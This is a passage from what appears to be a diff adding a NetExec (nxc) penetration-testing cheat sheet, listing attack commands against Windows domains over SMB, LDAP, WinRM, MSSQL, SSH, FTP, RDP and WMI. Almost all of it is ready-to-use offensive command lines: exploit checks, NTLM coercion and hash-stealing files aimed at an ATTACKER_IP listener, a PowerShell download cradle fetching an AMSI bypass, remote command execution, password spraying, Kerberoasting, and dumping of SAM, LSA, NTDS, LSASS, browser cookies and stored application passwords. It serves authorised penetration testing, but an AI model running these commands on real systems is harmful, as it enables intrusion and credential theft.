+nxc smb &lt;TARGET&gt; -u '' -p '' -M zerologon
+nxc smb &lt;TARGET&gt; -u '' -p '' -M printnightmare
+nxc smb &lt;TARGET&gt; -u '' -p '' -M smbghost
+nxc smb &lt;TARGET&gt; -u '' -p '' -M ms17-010
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -M nopac
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -M ntlm_reflection   # CVE-2025-33073
+
+## Run all at once
+nxc smb &lt;TARGET&gt; -u '' -p '' -M zerologon -M printnightmare -M smbghost -M ms17-010
+
+## Coerce checks (PetitPotam, DFSCoerce, PrinterBug, MSEven, ShadowCoerce)
+nxc smb &lt;TARGET&gt; -u '' -p '' -M coerce_plus
+nxc smb &lt;TARGET&gt; -u '' -p '' -M coerce_plus -o LISTENER=&lt;ATTACKER_IP&gt;
+nxc smb &lt;TARGET&gt; -u '' -p '' -M coerce_plus -o LISTENER=&lt;ATTACKER_IP&gt; ALWAYS=true
+nxc smb &lt;TARGET&gt; -u '' -p '' -M coerce_plus -o METHOD=PetitPotam
+## Short forms: M=pe (PetitPotam), M=pr (PrinterBug), M=dfs (DFSCoerce), L=&lt;IP&gt; (LISTENER)
+
+## Spooler and WebDav service check
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -M spooler
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -M webdav
+</code></pre>
+<h3>SMB Command Execution</h3>
+<blockquote>
+<p><strong>UAC Note:</strong> When UAC is enabled (default), only the built-in Administrator (RID 500) can execute remote commands as a local admin. Other local admins in the Administrators group will NOT get <code>Pwn3d!</code>. Set <code>LocalAccountTokenFilterPolicy = 1</code> to allow all local admins. Domain accounts in the local Administrators group are NOT affected by this restriction. Check <code>FilterAdministratorToken</code> — if set to 1, even RID 500 is blocked.</p>
+</blockquote>
+<pre><code class="language-bash">## CMD command (-x)
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -x 'whoami'
+
+## PowerShell command (-X) — auto AMSI bypass + obfuscation
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -X '$PSVersionTable'
+
+## Custom AMSI bypass payload (if default is detected)
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -X '&lt;CMD&gt;' --amsi-bypass /path/to/payload
+## Tip: if payload exceeds 8191 chars, host it on a web server and use a download cradle:
+## echo &quot;IEX(New-Object Net.WebClient).DownloadString('http://&lt;ATTACKER_IP&gt;/bypass.ps1');&quot; &gt; amsibypass.txt
+
+## Force execution method
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -x 'whoami' --exec-method wmiexec
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -x 'whoami' --exec-method atexec
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -x 'whoami' --exec-method smbexec
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -x 'whoami' --exec-method mmcexec
+## Default failover order: wmiexec → atexec → smbexec → mmcexec
+
+## Impersonate logged-on user via scheduled task
+nxc smb &lt;TARGET&gt; -u &lt;ADMIN&gt; -p '&lt;PASS&gt;' -M schtask_as -o USER=&lt;LOGGED_ON_USER&gt; CMD='whoami'
+nxc smb &lt;TARGET&gt; -u &lt;ADMIN&gt; -p '&lt;PASS&gt;' -M schtask_as -o USER=&lt;TARGET_USER&gt; CMD='whoami' BINARY=/path/to/binary
+
+## Process injection (SYSTEM → user context)
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -M pi -o PID=&lt;PID&gt; EXEC='&lt;COMMAND&gt;'
+</code></pre>
+<h3>SMB File Operations</h3>
+<pre><code class="language-bash">## Upload file
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --put-file /local/path \\remote\\path
+
+## Download file
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --get-file \\remote\\path /local/path
+
+## Spider shares (search for files)
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --spider &lt;SHARE&gt; --pattern &lt;KEYWORD&gt;      # Pattern match filenames
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --spider &lt;SHARE&gt; --regex .                # List all files/dirs
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --spider &lt;SHARE&gt; --content --regex &lt;TERM&gt; # Search file CONTENT
+
+## spider_plus module — JSON inventory of all accessible files
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -M spider_plus -o EXCLUDE_DIR=IPC$,print$,NETLOGON,SYSVOL
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -M spider_plus -o READ_ONLY=false         # Download all files
+## Output: /tmp/cme_spider_plus/&lt;IP&gt;.json
+</code></pre>
+<h3>SMB Credential Dumping (Requires Admin)</h3>
+<pre><code class="language-bash">## SAM hashes
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --sam
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --sam secdump          # Fallback method
+
+## LSA secrets (includes cached domain creds, DPAPI keys, service creds)
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --lsa
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --lsa secdump
+## DCC2 cached creds ($DCC2$ format) — crack with: hashcat -m 2100 hashes.txt wordlist
+## DCC2 hashes CANNOT be used for Pass-the-Hash
+
+## NTDS.dit (Domain Controller only)
+nxc smb &lt;DC_IP&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --ntds                  # Default: drsuapi
+nxc smb &lt;DC_IP&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --ntds vss              # Volume Shadow Copy
+nxc smb &lt;DC_IP&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --ntds --enabled        # Only enabled accounts
+nxc smb &lt;DC_IP&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --ntds --user Administrator
+nxc smb &lt;DC_IP&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --ntds --user NETBIOS/Administrator  # Multi-domain
+nxc smb &lt;DC_IP&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -M ntdsutil             # Via ntdsutil
+nxc smb &lt;DC_IP&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -M ntds-dump-raw -o TARGET=NTDS  # Raw disk access
+
+## LSASS dumping
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -M lsassy              # Via lsassy (in-memory, stealthy)
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -M procdump            # Via Sysinternals ProcDump (writes to disk)
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -M handlekatz          # Via cloned LSASS handle (obfuscated dump)
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -M nanodump            # Via nanodump (searches for existing handles)
+
+## DPAPI (Credential Manager, browsers)
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --dpapi
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --dpapi cookies         # Collect browser cookies
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --dpapi nosystem        # Skip system creds (stealthier)
+
+## SCCM credentials
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --sccm
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --sccm wmi
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --sccm disk
+
+## BackupOperator privilege dump (no local admin needed if SeBackupPrivilege)
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -M backup_operator
+
+## Token Broker Cache (Azure/M365 tokens)
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -M wam
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -M wam --pvk domain_backup_key.pvk
+
+## Application credential dumping modules
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -M keepass_discover     # Find KeePass
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -M keepass_trigger -o KEEPASS_CONFIG_PATH=&quot;&lt;PATH&gt;&quot;
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -M veeam                # Veeam backup passwords
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -M winscp               # WinSCP stored creds
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -M putty                # PuTTY keys/proxy creds
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -M vnc                  # VNC passwords
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -M mremoteng            # mRemoteNG creds
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -M rdcman               # Remote Desktop Conn Mgr
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -M notepad              # Unsaved Notepad docs
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -M notepad++            # Unsaved Notepad++ docs
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -M wifi                 # Saved WiFi passwords
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -M teams_localdb        # Microsoft Teams cookies
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -M eventlog_creds       # Event log 4688 creds
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -M security-questions   # Local security questions
+</code></pre>
+<h3>SMB GPP Credential Harvesting</h3>
+<pre><code class="language-bash">## GPP passwords — searches SYSVOL for Group Policy Preferences XML with embedded creds
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -M gpp_password
+
+## GPP autologin — searches for registry.xml autologin credentials in SYSVOL
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -M gpp_autologin
+</code></pre>
+<h3>SMB Hash Stealing Modules</h3>
+<pre><code class="language-bash">## Slinky — creates LNK files with UNC path icons on writable shares
+## When a user browses the share, their NTLMv2 hash is sent to your listener
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -M slinky -o SERVER=&lt;ATTACKER_IP&gt; NAME=&lt;LNK_NAME&gt;
+## Cleanup LNK files when done
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -M slinky -o NAME=&lt;LNK_NAME&gt; CLEANUP=YES
+
+## drop-sc — creates .searchConnector-ms files on writable shares (alternative to LNK)
+## URL must use escaped double backslashes
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -M drop-sc -o URL=\\\\&lt;ATTACKER_IP&gt;\\&lt;SHARE_NAME&gt; SHARE=&lt;TARGET_SHARE&gt; FILENAME=&lt;NAME&gt;
+## Cleanup
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -M drop-sc -o CLEANUP=True FILENAME=&lt;NAME&gt;
+
+## Capture hashes with Responder or relay with ntlmrelayx
+## sudo responder -I &lt;INTERFACE&gt;
+## sudo ntlmrelayx.py -tf relay.txt -smb2support --no-http
+</code></pre>
+<h3>SMB Miscellaneous</h3>
+<pre><code class="language-bash">## Change user password (own password or ForceChangePassword abuse)
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -M change-password -o NEWPASS='&lt;NEWPASS&gt;'
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -M change-password -o NEWNTHASH='&lt;HASH&gt;'
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -M change-password -o USER=&lt;TARGET_USER&gt; NEWPASS='&lt;NEWPASS&gt;'
+
+## Modify group membership (requires AddMember/AddSelf privilege)
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -M modify-group -o USER=&lt;TARGET_USER&gt; GROUP='&lt;GROUP&gt;'
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -M modify-group -o USER=&lt;TARGET_USER&gt; GROUP='&lt;GROUP&gt;' REMOVE=True
+</code></pre>
+<hr />
+<h2 id="ldap-protocol">LDAP Protocol</h2>
+<blockquote>
+<p><strong>Important:</strong> LDAP queries require the DC's FQDN, not just the IP. If using an IP, you may get "Error connecting to the domain." Either configure DNS to resolve the domain or add the FQDN to <code>/etc/hosts</code>.</p>
+</blockquote>
+<h3>LDAP Authentication &amp; Enumeration</h3>
+<pre><code class="language-bash">## Test credentials
+nxc ldap &lt;DC_IP&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;'
+nxc ldap &lt;DC_IP&gt; -u &lt;USER&gt; -H '&lt;NTHASH&gt;'
+nxc ldap &lt;DC_IP&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --no-smb   # Skip initial SMB connection
+
+## Test account existence (no password needed with Kerberos)
+nxc ldap &lt;DC_IP&gt; -u users.txt -p '' -k
+
+## Enumerate users
+nxc ldap &lt;DC_IP&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --users
+nxc ldap &lt;DC_IP&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --users-export users.txt
+nxc ldap &lt;DC_IP&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --active-users          # Only active accounts
+
+## Enumerate groups
+nxc ldap &lt;DC_IP&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --groups
+nxc ldap &lt;DC_IP&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --groups &quot;Domain Admins&quot;
+
+## Raw LDAP query
+nxc ldap &lt;DC_IP&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --query &quot;(sAMAccountName=Administrator)&quot; &quot;&quot;
+nxc ldap &lt;DC_IP&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --query &quot;(sAMAccountName=Administrator)&quot; &quot;sAMAccountName objectClass pwdLastSet&quot;
+nxc ldap &lt;DC_IP&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --query &quot;(adminCount=1)&quot; &quot;sAMAccountName&quot;
+
+## Domain SID
+nxc ldap &lt;DC_IP&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --get-sid
+
+## Admin count (privileged objects)
+nxc ldap &lt;DC_IP&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --admin-count
+
+## User descriptions (password hunting)
+nxc ldap &lt;DC_IP&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -M get-desc-users
+nxc ldap &lt;DC_IP&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -M get-desc-users -o FILTER=pass MINLENGTH=8
+
+## Login script paths
+nxc ldap &lt;DC_IP&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -M get-scriptpath
+
+## Machine Account Quota
+nxc ldap &lt;DC_IP&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -M maq
+
+## Domain subnets
+nxc ldap &lt;DC_IP&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -M get-network
+nxc ldap &lt;DC_IP&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -M get-network -o ALL=true           # Both IP and FQDN
+nxc ldap &lt;DC_IP&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -M get-network -o ONLY_HOSTS=true    # FQDN only
+
+## Group membership query (check which groups a user belongs to)
+nxc ldap &lt;DC_IP&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -M groupmembership -o USER=&lt;TARGET_USER&gt;
+
+## Password Settings Objects (Fine-Grained Password Policies)
+nxc ldap &lt;DC_IP&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --pso
+</code></pre>
+<h3>LDAP Kerberos Attacks</h3>
+<pre><code class="language-bash">## ASREPRoast (without auth — needs user list)
+nxc ldap &lt;DC_IP&gt; -u users.txt -p '' --asreproast output.txt
+## ASREPRoast (with auth — finds all vulnerable users)
+nxc ldap &lt;DC_IP&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --asreproast output.txt
+## Crack: hashcat -m18200 output.txt wordlist
+
+## Kerberoasting
+nxc ldap &lt;DC_IP&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --kerberoasting output.txt
+## Crack: hashcat -m13100 output.txt wordlist
+
+## Targeted Kerberoasting (set temporary SPN, then remove)
+nxc ldap &lt;DC_IP&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --kerberoasting output.txt --targeted-kerberoast &lt;VICTIM&gt;
+nxc ldap &lt;DC_IP&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --kerberoasting output.txt --targeted-kerberoast users.list
+
+## Kerberoasting via AS-REP (no preauth user to roast other SPNs)
+nxc ldap &lt;DC_IP&gt; -u &lt;ASREP_USER&gt; -p '' --no-preauth-targets target_users.list --kerberoasting output.txt
+</code></pre>
+<h3>LDAP Delegation</h3>
+<pre><code class="language-bash">## Find unconstrained delegation
+nxc ldap &lt;DC_IP&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --trusted-for-delegation
+
+## Find all misconfigured delegations (unconstrained, constrained, RBCD)
+nxc ldap &lt;DC_IP&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --find-delegation
+</code></pre>
+<h3>LDAP Trust &amp; Domain Enumeration</h3>
+<pre><code class="language-bash">## List DCs and enumerate trusts
+nxc ldap &lt;DC_IP&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --dc-list
+
+## Raisechild (child→parent trust abuse via Golden Ticket + extra SID)
+nxc ldap &lt;DC_IP&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -M raisechild
+nxc ldap &lt;DC_IP&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -M raisechild -o USER=&lt;EXIST_IN_BOTH&gt; USER_ID=&lt;RID&gt; ETYPE=aes256
+## Use ticket: export KRB5CCNAME=&lt;USER&gt;.ccache &amp;&amp; nxc ldap &lt;PARENT_DC&gt; --use-kcache
+</code></pre>
+<h3>LDAP Credential Extraction</h3>
+<pre><code class="language-bash">## gMSA password dump (requires LDAPS)
+nxc ldap &lt;DC_IP&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --gmsa
+
+## gMSA secret conversion
+nxc ldap &lt;DC_IP&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --gmsa-convert-id &lt;ID&gt;
+nxc ldap &lt;DC_IP&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --gmsa-decrypt-lsa '&lt;LSA_STRING&gt;'
+
+## Pre-created computer account abuse (Pre2K)
+nxc ldap &lt;DC_IP&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -M pre2k
+## Use: export KRB5CCNAME=&lt;MACHINE&gt;.ccache &amp;&amp; nxc ldap &lt;DC&gt; --use-kcache
+</code></pre>
+<h3>LDAP ADCS &amp; Security Checks</h3>
+<pre><code class="language-bash">## ADCS enumeration
+nxc ldap &lt;DC_IP&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -M adcs
+nxc ldap &lt;DC_IP&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -M adcs -o SERVER=&lt;CA_SERVER&gt;
+
+## LDAP signing check (now shown in host banner)
+nxc ldap &lt;DC_IP&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -M ldap-checker
+
+## DACL read
+nxc ldap &lt;DC_IP&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -M daclread -o TARGET=&lt;OBJECT&gt; ACTION=read
+nxc ldap &lt;DC_IP&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -M daclread -o TARGET=&lt;OBJECT&gt; ACTION=read PRINCIPAL=&lt;USER&gt;
+nxc ldap &lt;DC_IP&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -M daclread -o TARGET_DN=&quot;DC=domain,DC=local&quot; ACTION=read RIGHTS=DCSync
+nxc ldap &lt;DC_IP&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -M daclread -o TARGET=&lt;OBJECT&gt; ACTION=read ACE_TYPE=denied
+nxc ldap &lt;DC_IP&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -M daclread -o TARGET=targets.txt ACTION=backup
+
+## Unsecure DNS zones (dynamic update misconfiguration)
+nxc ldap &lt;DC_IP&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -M dns-nonsecure
+</code></pre>
+<h3>LDAP Infrastructure Enumeration</h3>
+<pre><code class="language-bash">## SCCM discovery
+nxc ldap &lt;DC_IP&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -M sccm -o REC_RESOLVE=TRUE
+
+## Entra ID (Azure AD Connect) sync server
+nxc ldap &lt;DC_IP&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -M entra-id
+</code></pre>
+<hr />
+<h2 id="winrm-protocol">WinRM Protocol</h2>
+<pre><code class="language-bash">## Authentication
+nxc winrm &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;'
+nxc winrm &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -d &lt;DOMAIN&gt;   # If SMB port closed
+
+## Password spray
+nxc winrm &lt;TARGET&gt; -u users.txt -p passwords.txt --no-bruteforce --continue-on-success
+
+## Command execution (PowerShell)
+nxc winrm &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -X 'whoami'
+
+## LAPS
+nxc winrm &lt;TARGET&gt; -u &lt;LAPS_READER&gt; -p '&lt;PASS&gt;' --laps
+
+## Credential dumping
+nxc winrm &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --sam
+nxc winrm &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --lsa
+nxc winrm &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --dpapi    # No admin needed for connecting user's Credential Manager
+</code></pre>
+<hr />
+<h2 id="mssql-protocol">MSSQL Protocol</h2>
+<blockquote>
+<p><strong>MSSQL Auth Types:</strong> Three types of accounts can authenticate: (1) <strong>AD account</strong> — use <code>-d &lt;DOMAIN&gt;</code>, (2) <strong>Local Windows account</strong> — use <code>-d .</code> or the machine name, (3) <strong>SQL account</strong> — use <code>--local-auth</code>. Password reuse between AD and SQL accounts is common.</p>
+</blockquote>
+<pre><code class="language-bash">## Authentication — Active Directory account
+nxc mssql &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -d &lt;DOMAIN&gt;
+## Authentication — Local Windows account
+nxc mssql &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -d .
+## Authentication — SQL account (local MSSQL database user)
+nxc mssql &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --local-auth
+## Non-default port
+nxc mssql &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --port 1434
+
+## Password spray
+nxc mssql &lt;TARGET&gt; -u users.txt -p passwords.txt --no-bruteforce --continue-on-success
+
+## Encryption check
+nxc mssql &lt;NETWORK&gt;/24                                   # EncryptionReq flag in banner
+
+## Channel binding check (relay possible?)
+nxc mssql &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -M mssql_cbt
+
+## SQL query execution
+nxc mssql &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -q 'SELECT name FROM master.dbo.sysdatabases;'
+
+## OS command via xp_cmdshell
+nxc mssql &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -x 'whoami'
+
+## Privilege escalation (impersonate sa)
+nxc mssql &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -M mssql_priv
+nxc mssql &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -M mssql_priv -o ACTION=privesc
+nxc mssql &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -M mssql_priv -o ACTION=rollback  # Undo
+
+## RID brute
+nxc mssql &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --rid-brute
+
+## File upload/download
+nxc mssql &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --put-file /local/file C:\\remote\\path
+nxc mssql &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --get-file C:\\remote\\path /local/file
+
+## Linked servers
+nxc mssql &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -M enum_links
+nxc mssql &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -M exec_on_link -o LINKED_SERVER=&lt;NAME&gt; COMMAND='select @@servername'
+nxc mssql &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -M link_enable_cmdshell -o LINKED_SERVER=&lt;NAME&gt; ACTION=enable
+nxc mssql &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -M link_xpcmd -o LINKED_SERVER=&lt;NAME&gt; CMD='whoami'
+nxc mssql &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -M link_enable_cmdshell -o LINKED_SERVER=&lt;NAME&gt; ACTION=disable
+</code></pre>
+<hr />
+<h2 id="ssh-protocol">SSH Protocol</h2>
+<pre><code class="language-bash">## Authentication
+nxc ssh &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;'
+nxc ssh &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --port 2222
+
+## Key-based authentication (key must be in OPENSSH format)
+nxc ssh &lt;TARGET&gt; -u &lt;USER&gt; --key-file &lt;PATH_TO_PRIVATE_KEY&gt; -p ''
+
+## Password spray
+nxc ssh &lt;TARGET&gt; -u users.txt -p passwords.txt --no-bruteforce --continue-on-success
+
+## Command execution
+nxc ssh &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -x 'whoami'
+
+## File operations
+nxc ssh &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --put-file local.txt /tmp/remote.txt
+nxc ssh &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --get-file /tmp/remote.txt local.txt
+</code></pre>
+<hr />
+<h2 id="ftp-protocol">FTP Protocol</h2>
+<pre><code class="language-bash">## Password spray
+nxc ftp &lt;TARGET&gt; -u users.txt -p passwords.txt --no-bruteforce --continue-on-success
+
+## List files
+nxc ftp &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --ls
+nxc ftp &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --ls &lt;DIRECTORY&gt;
+
+## Download/upload files
+nxc ftp &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --get &lt;REMOTE_FILE&gt;
+nxc ftp &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --put &lt;LOCAL_FILE&gt; &lt;REMOTE_FILE&gt;
+</code></pre>
+<hr />
+<h2 id="rdp-protocol">RDP Protocol</h2>
+<pre><code class="language-bash">## Password spray
+nxc rdp &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;'
+nxc rdp &lt;TARGET&gt; -u users.txt -p passwords.txt --no-bruteforce --continue-on-success
+
+## Command execution (beta — disconnects current user session)
+nxc rdp &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -x 'whoami'
+
+## Screenshot (authenticated) — useful for finding active sessions
+nxc rdp &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --screenshot
+nxc rdp &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --screenshot --screentime &lt;SECONDS&gt;  # Wait time for desktop (default: 10)
+nxc rdp &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --screenshot --res 1280x720          # Custom resolution (default: 1024x768)
+
+## Screenshot without NLA (login page only, no creds needed — reveals usernames)
+nxc rdp &lt;TARGET&gt; --nla-screenshot
+</code></pre>
+<hr />
+<h2 id="wmi-protocol">WMI Protocol</h2>
+<pre><code class="language-bash">## Authentication
+nxc wmi &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;'
+nxc wmi &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -d &lt;DOMAIN&gt;
+nxc wmi &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --local-auth
+
+## Password spray
+nxc wmi &lt;TARGET&gt; -u users.txt -p passwords.txt --no-bruteforce --continue-on-success
